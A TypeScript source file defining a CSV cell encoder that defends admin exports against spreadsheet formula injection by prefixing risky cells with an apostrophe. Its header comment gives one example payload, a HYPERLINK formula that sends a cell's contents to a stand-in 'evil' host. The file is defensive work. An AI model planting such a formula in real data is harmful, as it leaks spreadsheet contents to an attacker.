/**
 * CSV cell encoding shared by every export route.
 *
 * Exports carry player-controlled text (nicknames, clan names, comments), and
 * admins open them in Excel or LibreOffice. A cell beginning with `=`, `+`,
 * `-`, `@`, tab or carriage return is evaluated there as a formula (CSV / formula
 * injection, #366) — e.g. a nickname `=HYPERLINK("http://evil/?"&A1,"click")`.
 * Such text is prefixed with `'` so the spreadsheet shows it literally, as
 * recommended by OWASP: https://owasp.org/www-community/attacks/CSV_Injection
 */

const FORMULA_TRIGGER = /^[=+\-@\t\r]/;
/** Plain numbers such as `-3` or `+1.5` are data, not formulas, and stay intact. */
const PLAIN_NUMBER = /^[+-]?\d+(\.\d+)?$/;
const NEEDS_QUOTING = /[",;\r\n]/;

/**
 * Encodes one value as a CSV field.
 *
 * @param value the cell value; `null` becomes an empty field, numbers and
 *   booleans are written as-is
 * @returns the field, formula-neutralised and RFC 4180-quoted when it contains a
 *   quote, comma, semicolon or line break
 */
export function csvCell(value: string | number | boolean | null): string {
  if (value === null) return '';
  let text = String(value);
  if (typeof value === 'string' && FORMULA_TRIGGER.test(text) && !PLAIN_NUMBER.test(text)) {
    text = `'${text}`;
  }
  if (NEEDS_QUOTING.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
}
